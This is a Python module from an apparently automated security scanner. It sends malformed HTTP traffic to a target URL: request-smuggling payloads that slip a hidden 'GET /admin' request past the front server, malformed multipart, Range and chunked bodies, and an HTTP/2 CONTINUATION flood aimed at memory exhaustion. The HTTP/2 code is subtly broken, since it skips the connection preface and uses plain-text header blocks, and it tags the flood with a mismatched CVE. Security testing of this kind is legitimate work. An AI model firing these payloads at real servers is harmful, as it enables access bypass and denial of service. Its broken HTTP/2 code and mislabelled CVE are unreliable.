"""Framing-level fuzzer.

Adds protocol-layer fuzzing that the existing ``FuzzingOrchestrator`` does
not perform (it only mutates query-string parameters, not request framing).

Implements:

* CL/TE request smuggling (Content-Length vs Transfer-Encoding desync)
* TE/CL request smuggling (reverse direction)
* Multipart boundary fuzzing (truncated, duplicate, oversize boundary)
* Content-Range fuzzing against endpoints that advertise ``Accept-Ranges``
* Chunked-encoding state-machine fuzzing (invalid sizes, partial chunks,
  trailing CRLF manipulation, hex-size overflow)

Each fuzzer emits findings in the same dict shape used by
``FuzzingOrchestrator.run_fuzzing_campaign`` so the rest of the pipeline
consumes them transparently.
"""

from __future__ import annotations

import asyncio
import logging
import secrets
import ssl
import struct
from typing import Any
from urllib.parse import urlparse

import httpx

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.core.utils.url_validation import is_safe_url_with_dns_check

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Raw socket helpers - we cannot use httpx for any of the smuggling variants
# because httpx enforces well-formed framing.
# ---------------------------------------------------------------------------


async def _open_raw(
    url: str, verify_tls: bool
) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
    parsed = urlparse(url)
    host = parsed.hostname or "localhost"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    ssl_ctx: ssl.SSLContext | None = None
    if parsed.scheme == "https":
        ssl_ctx = ssl.create_default_context()
        if not verify_tls:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
    if ssl_ctx is not None:
        return await asyncio.open_connection(
            host=host, port=port, ssl=ssl_ctx, server_hostname=host
        )
    return await asyncio.open_connection(host=host, port=port)


async def _read_http_response(reader: asyncio.StreamReader, timeout: float = 8.0) -> dict[str, Any]:
    try:
        status_line = await asyncio.wait_for(reader.readline(), timeout=timeout)
    except Exception as exc:
        return {"error": f"status_read: {exc}"}
    if not status_line:
        return {"error": "empty_status"}
    parts = status_line.decode("latin-1", errors="replace").strip().split(" ", 2)
    status_code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    reason = parts[2] if len(parts) >= 3 else ""
    headers: dict[str, str] = {}
    body_chunks: list[bytes] = []
    in_body = False
    content_length: int | None = None
    while True:
        try:
            line = await asyncio.wait_for(reader.readline(), timeout=timeout)
        except Exception as exc:
            logger.debug("Header read failed: %s", exc, exc_info=True)
            break
        if line in (b"\r\n", b"\n", b""):
            in_body = True
            break
        if b":" in line:
            k, _, v = line.partition(b":")
            key = k.strip().lower().decode("latin-1")
            value = v.strip().decode("latin-1")
            headers[key] = value
            if key == "content-length":
                try:
                    content_length = int(value)
                except ValueError:
                    content_length = None
    if in_body:
        if content_length is not None:
            try:
                body_chunks.append(
                    await asyncio.wait_for(reader.readexactly(content_length), timeout=timeout)
                )
            except Exception as exc:
                body_chunks.append(f"truncated:{exc}".encode())
        else:
            try:
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=2.0)
                    if not chunk:
                        break
                    body_chunks.append(chunk)
            except Exception as exc:
                logger.warning("Operation failed in framing_fuzzer.py: %s", exc, exc_info=True)  # noqa: BLE001
    body = b"".join(body_chunks)
    return {"status_code": status_code, "reason": reason, "headers": headers, "body": body}


# ---------------------------------------------------------------------------
# CL/TE desync fuzz cases
# ---------------------------------------------------------------------------


def _cl_te_payloads() -> list[dict[str, Any]]:
    """CL/TE: front reads Content-Length, back reads Transfer-Encoding."""
    smuggled = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\nX-Smuggled: cl-te\r\n\r\n"
    return [
        {
            "label": "cl_te_chunked_smuggle",
            "headers": [
                "POST / HTTP/1.1",
                "Host: {host}",
                "Content-Type: application/x-www-form-urlencoded",
                "Content-Length: {cl}",
                "Transfer-Encoding: chunked",
                "",
            ],
            "body": smuggled,
        },
        {
            "label": "cl_te_x_smuggle",
            "headers": [
                "POST / HTTP/1.1",
                "Host: {host}",
                "Content-Length: {cl}",
                "Transfer-Encoding: xchunked",
                "Transfer-Encoding: chunked",
                "Content-Type: application/x-www-form-urlencoded",
                "",
            ],
            "body": smuggled,
        },
        {
            "label": "te_cl_chunked_smuggle",
            "headers": [
                "POST / HTTP/1.1",
                "Host: {host}",
                "Content-Type: application/x-www-form-urlencoded",
                "Transfer-Encoding: chunked",
                "Content-Length: {cl}",
                "",
            ],
            "body": smuggled,
        },
        {
            "label": "te_obfuscated",
            "headers": [
                "POST / HTTP/1.1",
                "Host: {host}",
                "Content-Type: application/x-www-form-urlencoded",
                "Transfer-Encoding: chunked",
                "Transfer-Encoding: identity",
                "Content-Length: {cl}",
                "",
            ],
            "body": smuggled,
        },
        {
            "label": "te_with_whitespace",
            "headers": [
                "POST / HTTP/1.1",
                "Host: {host}",
                "Content-Type: application/x-www-form-urlencoded",
                "Transfer-Encoding : chunked",
                "Content-Length: {cl}",
                "",
            ],
            "body": smuggled,
        },
    ]


# ---------------------------------------------------------------------------
# Multipart boundary fuzz cases
# ---------------------------------------------------------------------------


def _multipart_payloads() -> list[dict[str, Any]]:
    boundary = "----WebKitFormBoundary" + secrets.token_hex(8)
    return [
        {
            "label": "missing_closing_boundary",
            "boundary": boundary,
            "body": (
                f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
                "Content-Type: text/plain\r\n"
                "\r\n"
                "data-without-closing-boundary"
            ),
        },
        {
            "label": "duplicate_boundary",
            "boundary": boundary,
            "body": (
                f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="a"\r\n'
                "\r\n"
                "1\r\n"
                f"--{boundary}\r\n"
                f"--{boundary}\r\n"
                'Content-Disposition: form-data; name="b"\r\n'
                "\r\n"
                "2\r\n"
                f"--{boundary}--\r\n"
            ),
        },
        {
            "label": "oversized_boundary",
            "boundary": "A" * 4096,
            "body": "--"
            + ("A" * 4096)
            + '\r\nContent-Disposition: form-data; name="x"\r\n\r\n1\r\n',
        },
        {
            "label": "truncated_crlf",
            "boundary": boundary,
            "body": (
                f'--{boundary}\r\nContent-Disposition: form-data; name="x"\r\n\rincomplete-crlf'
            ),
        },
    ]


# ---------------------------------------------------------------------------
# Content-Range fuzz cases (target hosts that advertise Accept-Ranges)
# ---------------------------------------------------------------------------


def _content_range_payloads() -> list[dict[str, Any]]:
    return [
        {"label": "negative_start", "range": "bytes=-100-"},
        {"label": "huge_end", "range": "bytes=0-999999999999"},
        {"label": "inverted", "range": "bytes=500-100"},
        {"label": "multi_range_overlap", "range": "bytes=0-10, 20-30, 40-50"},
        {"label": "non_numeric", "range": "bytes=abc-def"},
        {"label": "suffix_overflow", "range": "bytes=-18446744073709551616"},
        {"label": "whitespace_padded", "range": "bytes = 0-99"},
    ]


# ---------------------------------------------------------------------------
# Chunked state machine fuzz cases
# ---------------------------------------------------------------------------


def _chunked_payloads() -> list[dict[str, Any]]:
    return [
        {"label": "negative_chunk_size", "body": "-1\r\nhello\r\n0\r\n\r\n"},
        {"label": "hex_overflow", "body": "FFFFFFFFFFFFFFFFF\r\nx\r\n0\r\n\r\n"},
        {"label": "missing_crlf_after_size", "body": "5\nhello\n0\n\n"},
        {"label": "truncated_chunk_data", "body": "10\r\nabc"},
        {"label": "extra_crlf_before_zero", "body": "5\r\nhello\r\n\r\n0\r\n\r\n"},
        {"label": "chunk_extension_junk", "body": "5;ext=value;evil=1\r\nhello\r\n0\r\n\r\n"},
        {"label": "no_terminating_chunk", "body": "5\r\nhello\r\n"},
        {"label": "size_with_only_cr", "body": "5\rhello\r\n0\r\n\r\n"},
    ]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def _build_continuation_frame(stream_id: int, header_block: bytes) -> bytes:
    length = len(header_block) & 0x00FFFFFF
    header = struct.pack(">I", length)[1:]
    header += struct.pack(">B", 0x09)
    header += struct.pack(">B", 0x00)
    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return header + header_block


def _h2_continuation_flood_payloads() -> list[dict[str, Any]]:
    p1_header_block = (":method GET\r\n:path /\r\n:scheme http\r\n" * 4).encode("latin-1")
    p2_header_block = (
        ":authority target\r\n:method GET\r\n:path /admin\r\n\r\n:method GET\r\n".encode("latin-1")
    )
    return [
        {
            "label": "h2_continuation_flood_cve_2023_44487",
            "header_block": p1_header_block,
        },
        {
            "label": "h2_pseudo_header_smuggle",
            "header_block": p2_header_block,
        },
    ]


async def _fuzz_h2_continuation_flood(
    url: str,
    host: str,
    endpoint_key: str,
    base_endpoint: str,
    endpoint_type: str,
    *,
    timeout_seconds: float,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    parsed = urlparse(url)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    ssl_ctx: ssl.SSLContext | None = None
    if parsed.scheme == "https":
        ssl_ctx = ssl.create_default_context()
    try:
        if ssl_ctx is not None:
            reader, writer = await asyncio.open_connection(
                host=host, port=port, ssl=ssl_ctx, server_hostname=host
            )
        else:
            reader, writer = await asyncio.open_connection(host=host, port=port)
    except Exception as exc:
        logger.debug("H2 continuation connection failed: %s", exc, exc_info=True)
        return findings
    try:
        frames = b""
        cases = _h2_continuation_flood_payloads()
        for case in cases:
            header_block = case["header_block"]
            for _ in range(60):
                frames += _build_continuation_frame(1, header_block)
        writer.write(frames)
        await writer.drain()
        resp = await _read_http_response(reader, timeout=timeout_seconds)
    except Exception as exc:
        logger.debug("h2 continuation flood raw read failed: %s", exc)
        resp = {"error": str(exc)}
    finally:
        try:
            writer.close()
        except Exception as exc:
            logger.warning("Operation failed in framing_fuzzer.py: %s", exc, exc_info=True)  # noqa: BLE001
    status_code = resp.get("status_code", 0)
    body = resp.get("body", b"")
    body_text = (
        body[:400].decode("latin-1", errors="replace")
        if isinstance(body, (bytes, bytearray))
        else ""
    )
    evidence = {
        "status_code": status_code,
        "body_preview": body_text,
        "frames_sent": 120,
        "reason": "HTTP/2 CONTINUATION flood without END_HEADERS",
    }
    if (
        status_code >= 500
        or "memory" in body_text.lower()
        or "overflow" in body_text.lower()
        or "continuation" in body_text.lower()
    ):
        findings.append(
            {
                "url": url,
                "endpoint_key": endpoint_key,
                "endpoint_base_key": base_endpoint,
                "endpoint_type": endpoint_type,
                "issues": [
                    "h2_continuation_flood_memory_exhaustion",
                    "h2_cve_2023_44487_continuation_dos",
                ],
                "probe_type": "framing_fuzzer",
                "severity": "critical",
                "confidence": 0.85,
                "evidence": evidence,
            }
        )
    elif status_code in (200, 201) and (
        "continuation" in body_text.lower() or "h2" in body_text.lower()
    ):
        findings.append(
            {
                "url": url,
                "endpoint_key": endpoint_key,
                "endpoint_base_key": base_endpoint,
                "endpoint_type": endpoint_type,
                "issues": ["h2_continuation_flood_pseudo_header_smuggle"],
                "probe_type": "framing_fuzzer",
                "severity": "high",
                "confidence": 0.65,
                "evidence": evidence,
            }
        )
    return findings


async def run_framing_fuzzing_campaign(
    url: str,
    client: httpx.AsyncClient | None = None,
    *,
    timeout_seconds: float = 5.0,
) -> list[dict[str, Any]]:
    """Run all framing-level fuzzers against a target URL.

    Returns a list of finding dicts in the same shape as
    ``FuzzingOrchestrator.run_fuzzing_campaign`` produces.
    """
    findings: list[dict[str, Any]] = []
    if not is_safe_url_with_dns_check(url):
        logger.warning("Framing fuzzer: URL failed SSRF safety check, skipping: %s", url)
        return findings

    parsed = urlparse(url)
    host = parsed.hostname or "localhost"
    endpoint_key = endpoint_signature(url)
    base_endpoint = endpoint_base_key(url)
    endpoint_type = classify_endpoint(url)

    findings.extend(
        await _fuzz_cl_te(
            url, host, endpoint_key, base_endpoint, endpoint_type, timeout_seconds=timeout_seconds
        )
    )
    findings.extend(
        await _fuzz_multipart(
            url,
            host,
            endpoint_key,
            base_endpoint,
            endpoint_type,
            client=client,
            timeout_seconds=timeout_seconds,
        )
    )
    findings.extend(
        await _fuzz_content_range(
            url,
            host,
            endpoint_key,
            base_endpoint,
            endpoint_type,
            client=client,
            timeout_seconds=timeout_seconds,
        )
    )
    findings.extend(
        await _fuzz_chunked(
            url, host, endpoint_key, base_endpoint, endpoint_type, timeout_seconds=timeout_seconds
        )
    )
    findings.extend(
        await _fuzz_h2_continuation_flood(
            url, host, endpoint_key, base_endpoint, endpoint_type, timeout_seconds=timeout_seconds
        )
    )
    return findings


# ---------------------------------------------------------------------------
# CL/TE
# ---------------------------------------------------------------------------


async def _fuzz_cl_te(
    url: str,
    host: str,
    endpoint_key: str,
    base_endpoint: str,
    endpoint_type: str,
    *,
    timeout_seconds: float,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    for case in _cl_te_payloads():
        body = case["body"].encode("latin-1")
        rendered = []
        for line in case["headers"]:
            if "{cl}" in line:
                rendered.append(line.replace("{cl}", str(len(body))))
            else:
                rendered.append(line.replace("{host}", host))
        raw = ("\r\n".join(rendered) + "\r\n").encode("latin-1") + body
        try:
            reader, writer = await _open_raw(url, verify_tls=True)
        except Exception as exc:
            logger.debug("CL/TE raw open failed: %s", exc, exc_info=True)
            continue
        try:
            writer.write(raw)
            await writer.drain()
            resp = await _read_http_response(reader, timeout=timeout_seconds)
        except Exception as exc:
            logger.debug("cl/te raw read failed: %s", exc)
            resp = {"error": str(exc)}
        finally:
            try:
                writer.close()
            except Exception as exc:
                logger.warning("Operation failed in framing_fuzzer.py: %s", exc, exc_info=True)  # noqa: BLE001
        if resp.get("status_code", 0) in (200, 201) and resp.get("body"):
            preview = resp["body"][:200].decode("latin-1", errors="replace")
            if "X-Smuggled" in preview or "smuggled" in preview.lower():
                findings.append(
                    {
                        "url": url,
                        "endpoint_key": endpoint_key,
                        "endpoint_base_key": base_endpoint,
                        "endpoint_type": endpoint_type,
                        "issues": ["framing_request_smuggling_confirmed"],
                        "probe_type": "framing_fuzzer",
                        "severity": "critical",
                        "confidence": 0.95,
                        "evidence": {
                            "scenario": case["label"],
                            "status_code": resp.get("status_code"),
                            "body_preview": preview,
                            "reason": "Smuggled request appeared in response body",
                        },
                    }
                )
            elif resp.get("status_code", 0) >= 500:
                findings.append(
                    {
                        "url": url,
                        "endpoint_key": endpoint_key,
                        "endpoint_base_key": base_endpoint,
                        "endpoint_type": endpoint_type,
                        "issues": ["framing_cl_te_server_crash"],
                        "probe_type": "framing_fuzzer",
                        "severity": "high",
                        "confidence": 0.75,
                        "evidence": {
                            "scenario": case["label"],
                            "status_code": resp.get("status_code"),
                            "reason": "CL/TE desync produced 5xx - parser desynchronization",
                        },
                    }
                )
    return findings


# ---------------------------------------------------------------------------
# Multipart boundary
# ---------------------------------------------------------------------------


async def _fuzz_multipart(
    url: str,
    host: str,
    endpoint_key: str,
    base_endpoint: str,
    endpoint_type: str,
    *,
    client: httpx.AsyncClient | None,
    timeout_seconds: float,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    if client is None:
        client = httpx.AsyncClient(timeout=timeout_seconds, verify=True)
        own = True
    else:
        own = False
    try:
        baseline = await client.get(url)
        baseline_len = len(baseline.text) if baseline else 0
    except Exception as exc:
        logger.debug("Multipart baseline request failed: %s", exc, exc_info=True)
        baseline_len = 0
    for case in _multipart_payloads():
        boundary = case["boundary"]
        body = case["body"]
        try:
            resp = await client.post(
                url,
                content=body,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "Content-Length": str(len(body)),
                },
            )
        except Exception as exc:
            logger.debug("Multipart post failed: %s", exc, exc_info=True)
            continue
        if resp is None:
            continue
        if resp.status_code in (200, 201) and abs(len(resp.text) - baseline_len) > 200:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": base_endpoint,
                    "endpoint_type": endpoint_type,
                    "issues": ["framing_multipart_boundary_bypass"],
                    "probe_type": "framing_fuzzer",
                    "severity": "high",
                    "confidence": 0.7,
                    "evidence": {
                        "scenario": case["label"],
                        "status_code": resp.status_code,
                        "length_delta": len(resp.text) - baseline_len,
                        "reason": "Multipart boundary mutation produced unexpected response",
                    },
                }
            )
        elif resp.status_code >= 500:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": base_endpoint,
                    "endpoint_type": endpoint_type,
                    "issues": ["framing_multipart_server_crash"],
                    "probe_type": "framing_fuzzer",
                    "severity": "medium",
                    "confidence": 0.7,
                    "evidence": {
                        "scenario": case["label"],
                        "status_code": resp.status_code,
                        "reason": "Multipart mutation triggered 5xx",
                    },
                }
            )
    if own:
        await client.aclose()
    return findings


# ---------------------------------------------------------------------------
# Content-Range
# ---------------------------------------------------------------------------


async def _fuzz_content_range(
    url: str,
    host: str,
    endpoint_key: str,
    base_endpoint: str,
    endpoint_type: str,
    *,
    client: httpx.AsyncClient | None,
    timeout_seconds: float,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    if client is None:
        client = httpx.AsyncClient(timeout=timeout_seconds, verify=True)
        own = True
    else:
        own = False
    try:
        # Only test endpoints that advertise range support or that look like
        # file/object resources.
        head = await client.head(url)
        accepts_ranges = (head.headers.get("accept-ranges") or "").lower() != "none"
    except Exception as exc:
        logger.debug("Content-Range HEAD request failed: %s", exc, exc_info=True)
        accepts_ranges = False
    if not accepts_ranges and not any(
        url.endswith(ext) for ext in (".zip", ".pdf", ".mp4", ".iso", ".bin")
    ):
        if own:
            await client.aclose()
        return findings
    for case in _content_range_payloads():
        try:
            resp = await client.get(url, headers={"Range": case["range"]})
        except Exception as exc:
            logger.debug("Content-Range GET failed: %s", exc, exc_info=True)
            continue
        if resp is None:
            continue
        if resp.status_code in (206, 200) and (
            "content-range" not in {k.lower() for k in resp.headers.keys()}
            and case["label"] in {"negative_start", "huge_end", "inverted"}
        ):
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": base_endpoint,
                    "endpoint_type": endpoint_type,
                    "issues": ["framing_content_range_accepted"],
                    "probe_type": "framing_fuzzer",
                    "severity": "medium",
                    "confidence": 0.6,
                    "evidence": {
                        "scenario": case["label"],
                        "range_sent": case["range"],
                        "status_code": resp.status_code,
                        "reason": "Malformed Content-Range accepted without 416",
                    },
                }
            )
        elif resp.status_code >= 500:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": base_endpoint,
                    "endpoint_type": endpoint_type,
                    "issues": ["framing_content_range_crash"],
                    "probe_type": "framing_fuzzer",
                    "severity": "medium",
                    "confidence": 0.65,
                    "evidence": {
                        "scenario": case["label"],
                        "range_sent": case["range"],
                        "status_code": resp.status_code,
                        "reason": "Malformed Content-Range triggered 5xx",
                    },
                }
            )
    if own:
        await client.aclose()
    return findings


# ---------------------------------------------------------------------------
# Chunked encoding state machine
# ---------------------------------------------------------------------------


async def _fuzz_chunked(
    url: str,
    host: str,
    endpoint_key: str,
    base_endpoint: str,
    endpoint_type: str,
    *,
    timeout_seconds: float,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    for case in _chunked_payloads():
        try:
            reader, writer = await _open_raw(url, verify_tls=True)
        except Exception as exc:
            logger.debug("Chunked raw open failed: %s", exc, exc_info=True)
            continue
        path = urlparse(url).path or "/"
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Transfer-Encoding: chunked\r\n"
            f"Content-Length: {len(case['body'])}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode("latin-1") + case["body"].encode("latin-1")
        try:
            writer.write(request)
            await writer.drain()
            resp = await _read_http_response(reader, timeout=timeout_seconds)
        except Exception as exc:
            resp = {"error": str(exc)}
        finally:
            try:
                writer.close()
            except Exception as exc:
                logger.warning("Operation failed in framing_fuzzer.py: %s", exc, exc_info=True)  # noqa: BLE001
        if resp.get("status_code", 0) in (200, 201) and resp.get("body"):
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": base_endpoint,
                    "endpoint_type": endpoint_type,
                    "issues": ["framing_chunked_state_smuggle"],
                    "probe_type": "framing_fuzzer",
                    "severity": "high",
                    "confidence": 0.7,
                    "evidence": {
                        "scenario": case["label"],
                        "status_code": resp.get("status_code"),
                        "body_preview": resp["body"][:200].decode("latin-1", errors="replace"),
                        "reason": "Malformed chunked body accepted with 200",
                    },
                }
            )
        elif resp.get("status_code", 0) >= 500:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": base_endpoint,
                    "endpoint_type": endpoint_type,
                    "issues": ["framing_chunked_state_crash"],
                    "probe_type": "framing_fuzzer",
                    "severity": "medium",
                    "confidence": 0.65,
                    "evidence": {
                        "scenario": case["label"],
                        "status_code": resp.get("status_code"),
                        "reason": "Malformed chunked body triggered 5xx",
                    },
                }
            )
    return findings
